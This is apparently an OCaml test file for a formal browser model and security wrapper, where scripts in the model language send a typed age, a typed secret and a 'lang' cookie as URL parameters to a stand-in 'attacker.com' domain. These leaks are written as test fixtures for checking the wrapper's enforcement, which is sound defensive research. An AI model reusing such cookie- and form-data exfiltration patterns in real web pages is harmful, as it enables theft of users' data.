(** Test file for the Airplane tickets e-commerce examples *)

open Reactive ;;
open Domain ;;
open Level ;;
open Io ;;
open Browser ;; 
open Policyfun ;;
open Wrapper ;;

open Browser.Impl ;;


(*==================== Auxilary variables for testing ====================*)

(* domain = air.com *)
let air_domain = ["com"; "air"]

(* domain = attacker.com *)
let leak_domain = ["com"; "attacker"]

(* domain = remote.com *)
let remote_domain = ["com"; "remote"]

let node_root = Get_win_root_node(Self_win)

let node_age = Get_child(node_root, Int(0))
let node_secret = Get_child(node_root, Int(1))
(*let node_c = Get_child(node_root, Int(2)) *)

let text_age = Get_node_attr(node_age, String("value"))
let text_secret = Get_node_attr(node_secret, String("value"))

let  http_url domain =  Http_url({ domain_value = domain},
                               { req_uri_path = {path_value=[]};
                                 req_uri_params = ""})

(*==================== Auxilary variables for AIR example ===============*)
       
(* let sum_taxes = Prim1( "IntToString", 
                 Prim2( "+", Prim1( "StringToInt", text_a), 
                             Prim1( "StringToInt", text_b) )) *)

let handler_air = Function({var_name="x"},[{var_name="y"}],                  
    Seq(        
        Set_node_attr(node_age, String("value"), text_age),
        Seq(                 
              Open_win (Prim2("addtourl", Url(http_url air_domain), text_age )), 
              Open_win (Prim2( "addtourl", Url(http_url leak_domain), text_age
              )) )
        ) 
    )

let handler_air_secret = Function({var_name="x"},[{var_name="y"}],                  
    Seq(        
        Set_node_attr(node_age, String("value"), text_age),
        Seq(                 
              Open_win (Prim2("addtourl", Url(http_url air_domain), text_secret )), 
              Open_win (Prim2( "addtourl", Url(http_url leak_domain),
              text_secret
              )) )
        ) 
    )


let script_air = Add_handler(node_age, handler_air)

let handler_air_to_remote = Function({var_name="x"},[{var_name="y"}],                  
    Seq(        
        Set_node_attr(node_age, String("value"), text_age),
        Seq(                 
              Open_win (Prim2("addtourl", Url(http_url air_domain), text_age )), 
              Open_win (Prim2( "addtourl", Url(http_url remote_domain), text_age
              )) )
        ) 
    )

let script_air_to_remote = Add_handler(node_age, handler_air_to_remote)

(* List of HTML elements*)
let doc_list_air = [
        Textbox(Some({elt_id_value="age"}), "0");
        Textbox(Some({elt_id_value="secret"}), "0");
] 


(*================= AIR example =======================================*)
(* The inline script attaches handler to the textbox "age" and opens a window with url 
 * "attacker.com" that leaks a+b as a parameter *) 

let html_file_inline_air = Html_file( List.append doc_list_air 
	[Inl_script(Some({elt_id_value="f"}), script_air)]
)

let inputs = [

  User_load_in_new_win_event(Http_url({domain_value= air_domain},{
          req_uri_path={path_value=[]} ; req_uri_params=""}));

  Network_response_event(Net_connection({domain_value=air_domain},0),
        {resp_del_cookies = []; resp_set_cookies = [("key","value")]; resp_body=
                html_file_inline_air} ) ; 

  (* User types "25" in the textbox "age" *)                 
  User_input_text_event(User_textbox(User_window((http_url air_domain), 0), 0),
  "25", None); 
]

(*==================== AIR: THIRD-PARTY SCRIPT example ===============*)
let html_file_remote_air =  Html_file( List.append doc_list_air 
	[Rem_script(Some({elt_id_value="rem"}),
        Http_url(({domain_value=remote_domain},{req_uri_path={path_value=[]} ;
        req_uri_params=""})))        
        ] 
)

let script_file_remote_air = Script_file(script_air_to_remote)

let inputs_remote = [

  User_load_in_new_win_event(Http_url({domain_value= air_domain},{
          req_uri_path={path_value=[]} ; req_uri_params=""}));

  Network_response_event(Net_connection({domain_value=air_domain},0),
        {resp_del_cookies = []; resp_set_cookies = [("key","value")]; resp_body=
                html_file_remote_air} ) ; 

  Network_response_event(Net_connection({domain_value=remote_domain},0),
        {resp_del_cookies = []; resp_set_cookies = [("key","value")]; resp_body=
                script_file_remote_air} ) ; 
                
  (* User types "25" in the textbox "age" *)                 
  User_input_text_event(User_textbox(User_window((http_url air_domain), 0), 0),
  "25", None); 
]

(*==================== AIR: STEALING COOKIES example ===============*)
let current_url = Get_win_location(Self_win)

let cookie_value = Get_cookie(current_url, String("lang")) 

let script_file_cookies = Script_file(
       Open_win(Prim2("addtourl", Url(http_url leak_domain), cookie_value))
)

let html_file_cookies = Html_file( List.append doc_list_air 
        [Inl_script(Some({elt_id_value="f"}),  Open_win(Prim2("addtourl",
        Url(http_url remote_domain), cookie_value))); 
                Rem_script(Some({elt_id_value="rem"}),
        Http_url(({domain_value=remote_domain},{req_uri_path={path_value=[]} ;
        req_uri_params=""})))        
        ]
)

let inputs_cookies = [

  User_load_in_new_win_event(Http_url({domain_value= air_domain},{
        req_uri_path={path_value=[]} ; req_uri_params=""}));

  Network_response_event(Net_connection({domain_value=air_domain},0),
        {resp_del_cookies = []; resp_set_cookies = [("lang","ru")]; resp_body=
                html_file_cookies} ) ; 

]

(*================= AIR example with secret =======================================*)
(* The inline script attaches handler to the textbox "age" and opens a window with url 
 * "attacker.com" that leaks a+b as a parameter *) 

let script_air_secret = Seq( Add_handler(node_age, handler_air),
                             Add_handler(node_secret, handler_air_secret))

let html_file_inline_air = Html_file( List.append doc_list_air 
	[Inl_script(Some({elt_id_value="f"}), script_air_secret)]
)

let inputs_secret = [

  User_load_in_new_win_event(Http_url({domain_value= air_domain},{
          req_uri_path={path_value=[]} ; req_uri_params=""}));

  Network_response_event(Net_connection({domain_value=air_domain},0),
        {resp_del_cookies = []; resp_set_cookies = [("key","value")]; resp_body=
                html_file_inline_air} ) ; 

  (* User types "25" in the textbox "age" *)                 
  User_input_text_event(User_textbox(User_window((http_url air_domain), 0), 0),
  "25", None); 

  (* User types "my secret" in the textbox "secret" *)                 
  User_input_text_event(User_textbox(User_window((http_url air_domain), 0), 1),
  "my secret", Some(H));   
]



(* ====================== RUN ORIGINAL BROWSER ====================== *)
(* Run until next waiting state, result = outputs appended to ol1 *)
let rec rtc_acc =
 function rs -> function ol1 ->      
	match (continue rs) with
	  (Waiting ws, ol2) -> (ws, List.append ol1 ol2) |
	  (Running rs2, ol2) -> rtc_acc rs2 (List.append ol1 ol2)

(* Compute all outputs for the list of inputs il, and append these outputs to ol *)	  
(* Run with: process_acc inputs [] start *)
let rec process_acc il ol s = 
  match s with
	Waiting sw -> (match il with 
        [] -> ol
              | i1::ins -> let (s2,ol2) = receive i1 sw in (process_acc ins (List.append ol ol2) s2) ) 
        | Running sr -> let (s2,ol2) = rtc_acc sr ol in process_acc il ol2 (Waiting s2)

(* Do one step in browser state bs, taking input from ies as needed, and appending output to oes *)
let step ies bs oes =
  match bs with
        (Waiting wbs) -> (match ies with 
                [] -> None 
                | ie1::ietl -> let (s2,oes2) = receive ie1 wbs in Some(ietl,s2,List.append oes oes2)) 
        | (Running rbs) -> let (s2,oes2) = continue rbs in Some(ies,s2,List.append oes oes2)

let original inputs = process_acc inputs [] start
	

(* ====================== RUN THE WRAPPER ====================== *)
(* Run until next waiting state, result = outputs appended to ol1 *)
let rec rtc_acc_w rs ol1 =     
	match (continue_w rs) with
	  (Waiting_w ws, ol2) -> (ws, List.append ol1 ol2) |
	  (Running_w rs2, ol2) -> rtc_acc_w rs2 (List.append ol1 ol2)

(* Compute all outputs for the list of inputs il, and append these outputs to ol *)	  
(* Run with: 
        * ocaml
        * #use "run.ml";;
        * process_acc_w inputs [] start_w *)
let rec process_acc_w il ol s = 
  match s with
	Waiting_w sw -> (match il with 
                [] -> ol
              | i1::ins -> let (s2,ol2) = receive_w i1 sw in (process_acc_w ins (List.append ol ol2) s2) ) 
        | Running_w sr -> let (s2,ol2) = rtc_acc_w sr ol in process_acc_w il ol2 (Waiting_w s2)


(* Take the first n elements of the list il*)

  let rec take n il = 
        match il with 
        [] -> []
        | i::tl -> if n>0 then i::(take (n-1) tl)
                   else []


let process_acc_lim_w il ol s n = process_acc_w (take n il) ol s


(* Do one step in browser state bs, taking input from ies as needed, and appending output to oes *)
let step_w ies bs oes =
  match bs with
        (Waiting_w wbs) -> (match ies with 
                [] -> None 
                | ie1::ietl -> let (s2,oes2) = receive_w ie1 wbs in Some(ietl,s2,List.append oes oes2)) 
        | (Running_w rbs) -> let (s2,oes2) = continue_w rbs in Some(ies,s2,List.append oes oes2)
      
let wrapper inputs = process_acc_w inputs [] start_w       

